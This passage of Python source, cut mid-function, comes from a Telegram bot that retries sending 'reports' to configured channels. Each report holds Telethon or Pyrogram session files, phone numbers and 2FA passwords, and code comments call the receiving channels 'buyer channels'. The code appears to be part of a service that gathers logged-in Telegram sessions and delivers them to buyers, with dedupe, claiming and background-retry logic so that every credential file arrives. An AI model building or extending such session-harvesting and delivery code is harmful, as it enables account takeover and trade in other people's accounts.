                report_text, telethon_file, pyrogram_file, user_id,
                work_dir, account_user_id,
            )
            if sent is not None:
                return sent
            print(f"🔁 pending/md {mode} report attempt {outer_attempt}/3 failed for {phone} - retrying")
            if outer_attempt < 3:
                await asyncio.sleep(min(2.0 * outer_attempt, 6.0))

        logger.error(
            "report_pending_or_multidevice: SELECTED format '%s' could not be produced/sent for %s "
            "after 3 attempts (session len=%s, telethon_file=%r, pyrogram_file=%r) - NOT sending a "
            "text substitute; the monitor safety net will keep retrying this report",
            selected, phone, len(session_string or ""), telethon_file, pyrogram_file)
        return None
    except Exception as e:
        logger.error("report_pending_or_multidevice: %s report FAILED for %s: %s", mode, phone, e)
        return None


async def report_pending_or_multidevice_safe(
    bot_client,
    mode: str,
    channel,
    phone: str,
    session_string: str,
    report_text: str,
    telethon_file=None,
    pyrogram_file=None,
    user_id=0,
):
    """Honor the admin-selected pending/multidevice format - FILE first, retry, never text-substitute.

    Every finalizer (delayed task, monitor full validation, fast path, recovery)
    must use this so the channel receives the session file of the exact
    admin-selected format - regardless of which code path finalized the session.

    When the file cannot be delivered even after the internal retries, a
    background retry task is spawned (in-process) AND the caller is expected to
    persist ``channel_report_pending`` so the monitor's per-cycle safety net
    keeps retrying after any restart. A text report is NEVER substituted for a
    file - the owner only accepts usable files.

    Returns the sent Message object, or ``None`` when nothing was delivered.
    """
    if not channel:
        logger.warning("report_pending_or_multidevice_safe: channel is None (mode=%s) - skipping for %s",
                       mode, phone)
        return None
    sent = await report_pending_or_multidevice(
        bot_client=bot_client,
        mode=mode,
        channel=channel,
        phone=phone,
        session_string=session_string or "",
        report_text=report_text,
        telethon_file=telethon_file,
        pyrogram_file=pyrogram_file,
        user_id=user_id,
    )
    if sent is not None:
        return sent
    # No file was delivered (generation/send failed after retries). NEVER
    # substitute a text report for a file: keep retrying in the background.
    logger.warning("report_pending_or_multidevice_safe: no file delivered for mode=%s (%s) - "
                   "spawning background retry (NO text substitute)", mode, phone)
    try:
        spawn_background(_retry_pending_or_multidevice_until_delivered(
            bot_client=bot_client,
            mode=mode,
            channel=channel,
            phone=phone,
            session_string=session_string or "",
            report_text=report_text,
            telethon_file=telethon_file,
            pyrogram_file=pyrogram_file,
            user_id=user_id,
        ), "pending-multidevice-report-retry")
    except Exception as spawn_err:
        logger.warning("report_pending_or_multidevice_safe: could not spawn background retry: %s",
                       spawn_err)
    return None


# ------------------------------------------------------------------
# Monitor safety net: retry a channel report that never arrived
# ------------------------------------------------------------------

async def _channel_already_has_report(message_type: str, phone: str, session_id: str) -> bool:
    """True when the target channel already contains this session's report.

    P5-54 dedupe guard: the delivery claim only protects CONCURRENT senders,
    so a crash between "delivered" and "flags persisted" made every restart
    re-send the files (duplicates in the buyer channels). A short search of
    the most recent channel messages for the exact phone number is enough:
    report captions always contain the phone, and a successful session's
    files are delivered within seconds of each other, so scanning the last
    few messages is decisive for the crash-window case.

    Search budget is bounded (<= 10 messages, one channel) so the safety net
    never stalls. Returns False on any lookup problem (fail-open to a real
    retry - a missed duplicate is less harmful than a permanently missing
    file).
    """
    try:
        from bot import config
        from bot.bootstrap.client import app

        digits = "".join(ch for ch in str(phone or "") if ch.isdigit())
        if not digits:
            return False
        if message_type == "MULTI-DEVICE":
            channel = config.get_channel("CHANNEL_24HR_UP")
        elif message_type == "PENDING":
            channel = config.get_channel("CHANNEL_SUBMIT")
        else:
            channel = config.get_channel("CHANNEL_VERIFIED")
        if not channel:
            return False

        scanned = 0
        async for msg in app.get_chat_history(channel, limit=10):
            scanned += 1
            if scanned > 10:
                break
            text = getattr(msg, "caption", None) or getattr(msg, "text", None) or ""
            if not text:
                continue
            text_digits = "".join(ch for ch in text if ch.isdigit())
            if digits and digits in text_digits:
                return True
        return False
    except Exception:
        return False


async def retry_channel_report(session_id: str, session_data: dict) -> bool:
    """Monitor per-cycle safety net: re-deliver SUCCESS / MULTI-DEVICE files.

    Only acts on sessions marked ``channel_report_pending`` (a report that
    failed after retries) whose user message was already delivered. On success
    the pending marker is cleared and ``channel_report_sent`` persisted, so the
    report is never delivered twice. This survives restarts: after a restart
    the pending marker is still in storage and the monitor retries the report.

    Returns True when the report was delivered (or was already delivered).
    """
    from bot.bootstrap.client import app
    from bot.utils.storage import replace_pending_session_data

    info = session_data.get("session_data", {})
    if not isinstance(info, dict):
        info = {}
    if info.get("channel_report_sent") is True:
        return True
    if info.get("channel_report_pending") is not True:
        # A report is retried when its in-progress marker is stale (the
        # sending path crashed mid-send) AND when it was never attempted at
        # all (the sending path crashed BEFORE the report block). The old
        # check only retried stale in-progress reports, so a crashed-before-
        # report session had its files permanently lost. is_channel_report_
        # delivery_stale returns False when no in-progress marker exists, so
        # treat "no marker, not pending" as never-attempted -> retry.
        if info.get("channel_report_in_progress"):
            from bot.utils.storage import is_channel_report_delivery_stale
            try:
                if not is_channel_report_delivery_stale(session_id):
                    return False
            except Exception:
                return False
        # else: never attempted -> fall through and retry the delivery.
    # PENDING reports are retried WITHOUT the final user message being
    # delivered: the session file must still reach CHANNEL_SUBMIT. The user
    # was already told "processing" at OTP time, and the pending-channel file
    # is a separate guarantee from the user-facing verdict message.
    message_type = info.get("message_type") or ""
    if message_type != "PENDING" and info.get("message_send_success") is not True:
        return False

    session_id_key = str(session_id)
    if session_id_key in _retry_in_flight:
        return False  # another retry path is already delivering this report
    _retry_in_flight.add(session_id_key)
    try:
        # CRITICAL: atomically claim the right to deliver the channel report.
        # Another path may have already delivered it (or be delivering it right
        # now) - never send the files twice.
        from bot.utils.storage import try_claim_channel_report, release_channel_report
        if not try_claim_channel_report(session_id):
            print(f"🔄 SAFETY NET: channel report for {session_id} already claimed/sent - skipping")
            return False
        delivered = False
        try:
            message_type = info.get("message_type") or ""
            session_string = session_data.get("session_string") or info.get("session_string") or ""
            if not session_string:
                logger.warning("retry_channel_report: no session_string for %s - cannot deliver files", session_id)
                return False
            phone = session_data.get("phone") or info.get("phone") or "UNKNOWN"
            user_id = str(session_data.get("user_id", "0") or "0")
            country_code = session_data.get("country_code") or info.get("country_code") or "UNKNOWN"

            # P5-54: dedupe before sending. The claim only guards CONCURRENT
            # senders; a crash between "delivered" and "flags persisted"
            # leaves the marker cleared while the files ARE in the channel -
            # every restart then re-sent the whole report (duplicate files in
            # the buyer channel). Search the target channel for this phone
            # first: if a previous report already landed, mark it sent and
            # stop. Best-effort: a failed search must NOT block a real retry.
            already_delivered = False
            try:
                already_delivered = await _channel_already_has_report(
                    message_type, phone, session_id
                )
            except Exception as dedupe_err:
                logger.debug("channel-report dedupe lookup failed for %s: %s", session_id, dedupe_err)
            if already_delivered:
                info["channel_report_sent"] = True
                info["channel_report_pending"] = False
                try:
                    replace_pending_session_data(session_id, info)
                except Exception:
                    pass
                print(f"♻️ SAFETY NET: report for {phone} already present in channel - deduped, no re-send")
                return True

            rate = float(session_data.get("rate", 0) or info.get("country_rate", 0) or 0)
            spam_status = info.get("spam_status", "limit") or "limit"
            twofa_password = (
                session_data.get("twofa_password")
                or info.get("twofa_password")
                or info.get("2fa_password")
                or config.get_2fa_password()
            )

            if message_type == "SUCCESS":
                from bot.services.reports import build_success_report
                report = build_success_report(
                    phone, country_code, rate, spam_status,
                    report_label="RETRY",
                    name=(info.get("first_name") or ""),
                    account_id=info.get("user_id") or info.get("account_id"),
                    twofa_enabled=info.get("twofa_enabled"),
                    verified_by=user_id,
                )
                outcomes = await report_success_session(
                    bot_client=app,
                    phone=phone,
                    user_id=user_id,
                    session_info=info,
                    session_string=session_string,
                    twofa_password=twofa_password,
                    country_code=country_code,
                    rate=rate,
                    account_status=spam_status,
                    status_details=info.get("status_details") or {},
                    success_report=report,
                    telethon_file=None,
                    pyrogram_file=None,
                    session_id=session_id,
                )
                delivered = _all_attempted_formats_delivered(outcomes)
                print(f"🔄 SAFETY NET: SUCCESS report retry for {phone}: {outcomes}")
            elif message_type == "MULTI-DEVICE":
                from bot.services.reports import build_multi_device_report
                report = build_multi_device_report(
                    phone, country_code, info.get("device_count", "Unknown"),
                    report_label="RETRY", user_id=user_id,
                )
                sent = await report_pending_or_multidevice(
                    bot_client=app,
                    mode="multidevice",
                    channel=config.get_channel("CHANNEL_24HR_UP"),
                    phone=phone,
                    session_string=session_string,
                    report_text=report,
                    telethon_file=None,
                    pyrogram_file=None,
                    user_id=user_id,
                )
                delivered = sent is not None
                print(f"🔄 SAFETY NET: MULTI-DEVICE report retry for {phone}: delivered={delivered}")
            elif message_type == "PENDING":
                from bot.services.reports import build_pending_report
                report = build_pending_report(
                    phone, country_code,
                    title="Pending Session - Retry",
                    user_id=user_id,
                )
                # The pending channel ALWAYS receives the file of the
                # admin-selected format (no env gate). The old
                # PENDING_FILE_REPORTS default-OFF gate silently stripped the
                # session string so only a text ever landed in the channel.
                sent = await report_pending_or_multidevice(
                    bot_client=app,
                    mode="pending",
                    channel=config.get_channel("CHANNEL_SUBMIT"),
                    phone=phone,
                    session_string=session_string or "",
                    report_text=report,
                    telethon_file=None,
                    pyrogram_file=None,
                    user_id=user_id,
                )
                delivered = sent is not None
                print(f"🔄 SAFETY NET: PENDING report retry for {phone}: delivered={delivered}")
            else:
                logger.warning("retry_channel_report: unsupported message_type %r for %s",
                               message_type, session_id)
                return False

            if delivered:
                info["channel_report_sent"] = True
                info["channel_report_pending"] = False
                try:
                    replace_pending_session_data(session_id, info)
                except Exception as persist_err:
                    logger.warning("retry_channel_report: could not persist flags for %s: %s",
                                   session_id, persist_err)
                print(f"✅ SAFETY NET: channel report delivered for {phone} ({message_type})")
            else:
                print(f"⚠️ SAFETY NET: channel report still not delivered for {phone} - retrying next cycle")
            return delivered
        finally:
            release_channel_report(session_id, sent=delivered)
    except Exception as e:
        logger.error("retry_channel_report FAILED for %s: %s", session_id, e)
        return False
    finally:
        _retry_in_flight.discard(session_id_key)

